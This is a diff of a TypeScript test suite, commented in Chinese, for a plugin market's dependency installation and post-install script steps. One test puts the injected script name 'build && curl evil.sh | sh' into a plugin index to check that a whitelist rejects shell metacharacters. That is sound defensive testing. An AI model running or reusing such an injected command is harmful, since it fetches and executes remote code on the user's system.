@@ -17,6 +17,7 @@ import type { HttpClient } from "@yunzai-ng/types"
 import { isDirectory, isFile } from "../util/fs.js"
 import { fakeLogger, type FakeLogger } from "../testing/fake.js"
 import { buildTarGz } from "./tar.js"
+import type { PmRunner, PmTask } from "./pm.js"
 import {
   PluginMarket,
   applyMirror,
@@ -135,6 +136,52 @@ function stubGit(options: StubGitOptions = {}): StubGit {
   return { run, calls, cmds: () => calls.map(item => item.args[0] ?? "") }
 }
 
+/** 一次包管理器调用的全部入参 */
+interface PmCall {
+  /** 动作 */
+  task: PmTask
+  /** 工作目录 */
+  cwd: string
+}
+
+/** 包管理器替身的可编程行为 */
+interface StubPmOptions {
+  /** 令某个动作失败：`install`，或某个 script 名 */
+  fail?: { at: string; message: string }
+  /** 某个动作执行后的副作用，用于模拟 `build` 产出了 `dist/` */
+  effect?: (task: PmTask) => Promise<void> | void
+}
+
+/** 包管理器替身与其调用记录 */
+interface StubPm {
+  /** 注入 `MarketDeps.pm` 的执行器 */
+  run: PmRunner
+  /** 依次收到的调用 */
+  calls: PmCall[]
+}
+
+/**
+ * 造一个不起子进程的包管理器
+ *
+ * 记下**下发了什么**：装依赖带不带 devDependencies、跑的是哪几个 script、以什么次序。
+ * 真实的 pnpm 只能告诉你「最后目录里有 node_modules」，而少跑一个 `build`、或用
+ * `--prod` 装完再去跑 `build`，同样能得到一个看着对的目录 —— 直到插件加载时报出一条
+ * 与原因无关的错。故此处逐条比对入参。
+ * @param options 可编程行为
+ * @returns 执行器与调用记录
+ */
+function stubPm(options: StubPmOptions = {}): StubPm {
+  const calls: PmCall[] = []
+  const run: PmRunner = async (task, cwd) => {
+    calls.push({ task, cwd })
+    const at = task.kind === "install" ? "install" : task.script
+    if (options.fail?.at === at) throw new Error(options.fail.message)
+    await options.effect?.(task)
+    return "pnpm"
+  }
+  return { run, calls }
+}
+
 /** 一套市场及其周边 */
 interface Harness {
   /** 市场 */
@@ -159,13 +206,15 @@ let harness: Harness | undefined
  * @param settings 配置覆盖
  * @param reuse 复用已有的临时目录（用于验证磁盘缓存跨实例生效）
  * @param git git 执行器替身，不给则连接一个「本机没有 git」的桩
+ * @param pm 包管理器替身，不给则连接一个「不该被调用」的桩
  * @returns 市场与周边
  */
 async function makeHarness(
   routes: Record<string, StubReply>,
   settings: Partial<MarketSettings> = {},
   reuse?: Harness,
-  git?: GitRunner
+  git?: GitRunner,
+  pm?: PmRunner
 ): Promise<Harness> {
   const root = reuse?.root ?? (await mkdtemp(join(tmpdir(), "yzng-market-")))
   const pluginsDir = join(root, "plugins")
@@ -195,7 +244,15 @@ async function makeHarness(
      * 归档 —— 两条完全不同的代码路径，而用例里看不出走的是哪条。抛错即令 `#hasGit()`
      * 记下 false，归档那条路由此成为确定的行为。
      */
-    git: git ?? (() => Promise.reject(new Error("用例未注入 git 替身")))
+    git: git ?? (() => Promise.reject(new Error("用例未注入 git 替身"))),
+    /*
+     * 不给替身的用例一律当作「不该跑包管理器」
+     *
+     * 缺省若落到真实的 pnpm 上，用例会在开发机上起子进程去联网装依赖 —— 慢、看网络脸色，
+     * 且**装出来的东西落在临时目录里，afterEach 一删了之，于是断言什么也验不到**。抛错则
+     * 令「本不该跑却跑了」当场失败，那正是要钉住的：缺省不跑依赖是一条行为约定。
+     */
+    pm: pm ?? (() => Promise.reject(new Error("用例未注入包管理器替身")))
   })
   harness = { market, pluginsDir, cacheFile, logger, calls, root }
   return harness
@@ -777,5 +834,321 @@ describe("PluginMarket 卸载", () => {
   it("越界名称在删除前即被拒绝", async () => {
     const h = await makeHarness({ "https://example.com/index.json": { json: INDEX } })
     await expect(h.market.remove("../..")).rejects.toThrow("不合法")
+  })
+})
+
+/** 声明了装后步骤的索引：从源码装、要 build 才有产物的那一类 */
+const SETUP_INDEX = {
+  plugins: [
+    {
+      name: "demo",
+      title: "示例",
+      version: "1.0.0",
+      install: { type: "tarball", url: TARBALL },
+      setup: { scripts: ["build", "install:browser"] }
+    }
+  ]
+}
+
+describe("装依赖与装后步骤", () => {
+  it("不要求时一个包管理器命令都不下发，仅提示需自行安装", async () => {
+    const pm = stubPm()
+    const h = await makeHarness(
+      {
+        "https://example.com/index.json": { json: INDEX },
+        [TARBALL]: { bytes: pluginArchive({ version: "1.0.0", dependencies: { lodash: "^4" } }) }
+      },
+      {},
+      undefined,
+      undefined,
+      pm.run
+    )
+
+    const result = await h.market.install("demo")
+
+    expect(pm.calls).toEqual([])
+    expect(result).toMatchObject({ needsDependencies: true })
+    expect(result.installedDeps).toBeUndefined()
+    expect(h.logger.lines.some(line => line.includes("声明了运行时依赖"))).toBe(true)
+  })
+
+  it("要求时在插件目录内装依赖，缺省不带 devDependencies", async () => {
+    const pm = stubPm()
+    const h = await makeHarness(
+      {
+        "https://example.com/index.json": { json: INDEX },
+        [TARBALL]: { bytes: pluginArchive({ version: "1.0.0", dependencies: { lodash: "^4" } }) }
+      },
+      {},
+      undefined,
+      undefined,
+      pm.run
+    )
+
+    const result = await h.market.install("demo", { dependencies: true })
+
+    expect(pm.calls).toEqual([{ task: { kind: "install", dev: false }, cwd: join(h.pluginsDir, "demo") }])
+    expect(result).toMatchObject({ needsDependencies: false, installedDeps: true, packageManager: "pnpm" })
+    // 装成了就不该再提示「需自行安装」——那句话在此处是假的
+    expect(h.logger.lines.some(line => line.includes("需在其目录内自行执行"))).toBe(false)
+  })
+
+  it("**没声明依赖的插件不跑包管理器**，即便要求了", async () => {
+    const pm = stubPm()
+    const h = await makeHarness(
+      {
+        "https://example.com/index.json": { json: INDEX },
+        [TARBALL]: { bytes: pluginArchive({ version: "1.0.0" }) }
+      },
+      {},
+      undefined,
+      undefined,
+      pm.run
+    )
+
+    const result = await h.market.install("demo", { dependencies: true })
+
+    // 无依赖可装时跑一趟只是白等一次网络往返
+    expect(pm.calls).toEqual([])
+    expect(result).toMatchObject({ needsDependencies: false })
+  })
+
+  it("声明了装后步骤时连 devDependencies 一起装，再按序跑脚本", async () => {
+    const pm = stubPm()
+    const h = await makeHarness(
+      {
+        "https://example.com/index.json": { json: SETUP_INDEX },
+        [TARBALL]: { bytes: pluginArchive({ version: "1.0.0", dependencies: { lodash: "^4" } }) }
+      },
+      {},
+      undefined,
+      undefined,
+      pm.run
+    )
+
+    const result = await h.market.install("demo", { dependencies: true })
+
+    /*
+     * 这一条钉两件事，错任一件都只在插件加载时才报一条离原因很远的错
+     *
+     * 一是 `dev: true` —— `build` 要的编译器在 devDependencies 里，`--prod` 装完再跑
+     * `build` 会报「找不到 tsc」。二是脚本的**次序**：`install:browser` 建立在 `build` 之后。
+     */
+    expect(pm.calls.map(item => item.task)).toEqual([
+      { kind: "install", dev: true },
+      { kind: "run", script: "build" },
+      { kind: "run", script: "install:browser" }
+    ])
+    expect(result.ranScripts).toEqual(["build", "install:browser"])
+    expect(result.setupError).toBeUndefined()
+  })
+
+  it("**装依赖失败不让整次安装失败**，但脚本一个都不跑", async () => {
+    const pm = stubPm({ fail: { at: "install", message: "registry 连不上" } })
+    const h = await makeHarness(
+      {
+        "https://example.com/index.json": { json: SETUP_INDEX },
+        [TARBALL]: { bytes: pluginArchive({ version: "1.0.0", dependencies: { lodash: "^4" } }) }
+      },
+      {},
+      undefined,
+      undefined,
+      pm.run
+    )
+
+    const result = await h.market.install("demo", { dependencies: true })
+
+    // 插件目录已经就位，抛出去会让使用者以为「什么都没装成」而去重装
+    expect(await isFile(join(h.pluginsDir, "demo", "index.js"))).toBe(true)
+    expect(result).toMatchObject({ needsDependencies: true, installedDeps: false })
+    expect(result.dependencyError).toContain("registry 连不上")
+    // 脚本多半建立在依赖之上，接着跑只会得到第二条更难懂的错误
+    expect(pm.calls.map(item => item.task.kind)).toEqual(["install"])
+    expect(result.ranScripts).toBeUndefined()
+  })
+
+  it("脚本失败即停，已跑完的那些如实记下", async () => {
+    const pm = stubPm({ fail: { at: "build", message: "TS2339: 类型上不存在该属性" } })
+    const h = await makeHarness(
+      {
+        "https://example.com/index.json": { json: SETUP_INDEX },
+        [TARBALL]: { bytes: pluginArchive({ version: "1.0.0", dependencies: { lodash: "^4" } }) }
+      },
+      {},
+      undefined,
+      undefined,
+      pm.run
+    )
+
+    const result = await h.market.install("demo", { dependencies: true })
+
+    expect(result.ranScripts).toEqual([])
+    // 失败在哪个脚本上必须带出来：缺产物与缺依赖的后手完全不同
+    expect(result.setupError).toContain("build")
+    expect(result.setupError).toContain("TS2339")
+    // 依赖是装好的，故这一项为假 —— 与 dependencyError 那条路要分得开
+    expect(result).toMatchObject({ needsDependencies: false, installedDeps: true })
+    expect(pm.calls.map(item => item.task.kind)).toEqual(["install", "run"])
+  })
+
+  it("索引里的 script 名不合法时整条装后步骤丢弃，退回只装依赖", async () => {
+    const pm = stubPm()
+    const h = await makeHarness(
+      {
+        "https://example.com/index.json": {
+          json: {
+            plugins: [
+              {
+                name: "demo",
+                install: { type: "tarball", url: TARBALL },
+                // 带 shell 元字符：这一条正是白名单要挡住的东西
+                setup: { scripts: ["build && curl evil.sh | sh"] }
+              }
+            ]
+          }
+        },
+        [TARBALL]: { bytes: pluginArchive({ version: "1.0.0", dependencies: { lodash: "^4" } }) }
+      },
+      {},
+      undefined,
+      undefined,
+      pm.run
+    )
+
+    const result = await h.market.install("demo", { dependencies: true })
+
+    // 一个名字不合法就整条丢弃：过滤后继续会得到一份「跑了一半」的装后步骤
+    expect(pm.calls.map(item => item.task)).toEqual([{ kind: "install", dev: false }])
+    // 装依赖照跑（那一步与 setup 无关），只是没有任何 script 被执行
+    expect(result.ranScripts).toEqual([])
+    expect(h.logger.lines.some(line => line.includes("不合法的 script 名"))).toBe(true)
+  })
+
+  it("就地拉取没拉到新提交、且依赖不缺时不跑收尾", async () => {
+    const pm = stubPm()
+    const git = stubGit({ heads: ["1111111aaa"] })
+    const h = await makeHarness(
+      {
+        "https://example.com/index.json": {
+          json: { plugins: [{ ...GIT_INDEX.plugins[0], setup: { scripts: ["build"] } }] }
+        }
+      },
+      {},
+      undefined,
+      git.run,
+      pm.run
+    )
+    await makeGitRepo(h.pluginsDir)
+
+    const result = await h.market.update("demo", { dependencies: true })
+
+    // 什么都没改，重跑 build 只是白等一遍编译
+    expect(result.changed).toBe(false)
+    expect(pm.calls).toEqual([])
+  })
+
+  it("就地拉到新提交时重跑装后步骤，哪怕依赖不缺", async () => {
+    const pm = stubPm()
+    const git = stubGit()
+    const h = await makeHarness(
+      {
+        "https://example.com/index.json": {
+          json: { plugins: [{ ...GIT_INDEX.plugins[0], setup: { scripts: ["build"] } }] }
+        }
+      },
+      {},
+      undefined,
+      git.run,
+      pm.run
+    )
+    // makeGitRepo 建的目录里已有 node_modules，故依赖不缺
+    await makeGitRepo(h.pluginsDir)
+
+    const result = await h.market.update("demo", { dependencies: true })
+
+    /*
+     * `dist/` 多半被插件仓库 gitignore 掉了：拉来新提交之后 `node_modules` 还在，
+     * 而产物是旧的。此时跳过 build，插件跑的就还是上一版代码，且毫无迹象。
+     */
+    expect(result.changed).toBe(true)
+    expect(pm.calls.map(item => item.task)).toEqual([{ kind: "install", dev: true }, { kind: "run", script: "build" }])
+  })
+})
+
+describe("PluginMarket.setup", () => {
+  it("对已装好的目录重跑，即便依赖不缺也跑一遍", async () => {
+    const pm = stubPm()
+    const h = await makeHarness(
+      { "https://example.com/index.json": { json: SETUP_INDEX } },
+      {},
+      undefined,
+      undefined,
+      pm.run
+    )
+    const dir = join(h.pluginsDir, "demo")
+    await mkdir(join(dir, "node_modules"), { recursive: true })
+    await writeFile(join(dir, "package.json"), JSON.stringify({ version: "1.2.3", dependencies: { lodash: "^4" } }), "utf8")
+
+    const result = await h.market.setup("demo")
+
+    /*
+     * 使用者点这个按钮，多半正是因为 package.json 的依赖变过而 node_modules 是旧的
+     *
+     * 那种「旧」从目录存不存在上看不出来，而包管理器自己比对 lock 文件本就是幂等的。
+     */
+    expect(pm.calls.map(item => item.task)).toEqual([
+      { kind: "install", dev: true },
+      { kind: "run", script: "build" },
+      { kind: "run", script: "install:browser" }
+    ])
+    expect(result).toMatchObject({ name: "demo", dir, version: "1.2.3", installedDeps: true })
+  })
+
+  it("索引里没有这个插件也照做，只是不跑装后步骤", async () => {
+    const pm = stubPm()
+    const h = await makeHarness(
+      { "https://example.com/index.json": { json: INDEX } },
+      {},
+      undefined,
+      undefined,
+      pm.run
+    )
+    // 手工放进插件目录的插件：不在任何索引里
+    const dir = join(h.pluginsDir, "handmade")
+    await mkdir(dir, { recursive: true })
+    await writeFile(join(dir, "package.json"), JSON.stringify({ version: "0.1.0", dependencies: { lodash: "^4" } }), "utf8")
+
+    const result = await h.market.setup("handmade")
+
+    // 拿不到条目就拒绝，会让这个按钮恰在最需要它的场合失效
+    expect(pm.calls.map(item => item.task)).toEqual([{ kind: "install", dev: false }])
+    expect(result).toMatchObject({ installedDeps: true, needsDependencies: false })
+  })
+
+  it("目录不存在时抛错，越界名称在此之前即被拒绝", async () => {
+    const h = await makeHarness({ "https://example.com/index.json": { json: INDEX } })
+
+    await expect(h.market.setup("nothere")).rejects.toThrow("不存在")
+    await expect(h.market.setup("../..")).rejects.toThrow("不合法")
+  })
+
+  it("没有 package.json 的插件不跑包管理器", async () => {
+    const pm = stubPm()
+    const h = await makeHarness(
+      { "https://example.com/index.json": { json: INDEX } },
+      {},
+      undefined,
+      undefined,
+      pm.run
+    )
+    const dir = join(h.pluginsDir, "demo")
+    await mkdir(dir, { recursive: true })
+    await writeFile(join(dir, "index.js"), "export default 1", "utf8")
+
+    const result = await h.market.setup("demo")
+
+    // 单文件插件没有依赖可言，跑一趟只会在一个没有 package.json 的目录里报错
+    expect(pm.calls).toEqual([])
+    expect(result).toMatchObject({ needsDependencies: false, version: "0.0.0" })
   })
 })
